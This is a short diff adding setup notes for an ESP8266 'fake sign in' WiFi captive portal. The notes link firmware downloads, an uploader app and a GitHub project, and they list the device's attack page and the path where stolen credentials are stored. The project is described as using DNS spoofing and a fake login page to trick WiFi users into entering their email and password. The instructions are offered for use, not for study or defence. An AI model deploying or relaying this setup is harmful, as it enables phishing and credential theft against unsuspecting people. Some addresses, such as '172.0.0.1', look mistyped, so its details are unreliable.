@@ -1,0 +1,21 @@
+#esp8266 V. 2.0 (Fake sign in) file link
+https://drive.google.com/drive/folders/1LTdsSIwwLEWJLL7neuJKsmJ95r5utX9_?usp=drive_link
+# and upload file to apk
+https://apkpure.com/esp8266-loader-blynk-uploader/com.bluino.esploader
+172.0.0.1/index
+172.0.0.1/post
+172.0.0.1/creds
+# and go this ip and select target wifi
+http://192.168.4.1/attack.html
+#any problem here pls look this WEBSITE
+https://github.com/adamff-dev/ESP8266_WiFi_Captive_Portal_2.0
+
+##############################################################################################################
+About this project
+WiFi captive portal for the NodeMCU (ESP8266 Module) with DNS spoofing. It asks the user for an email and a password for a fake sign in, in order to "get connected to the internet".
+
+The built-in LED will blink 5 times when some credentials are posted.
+
+Warning! Your saved credentials will disappear when you restart/power off the ESP8266.
+
+Note: If you want to see the stored credetials go to "http://yourcurrentwebsite.com/creds" or "172.0.0.1/creds"
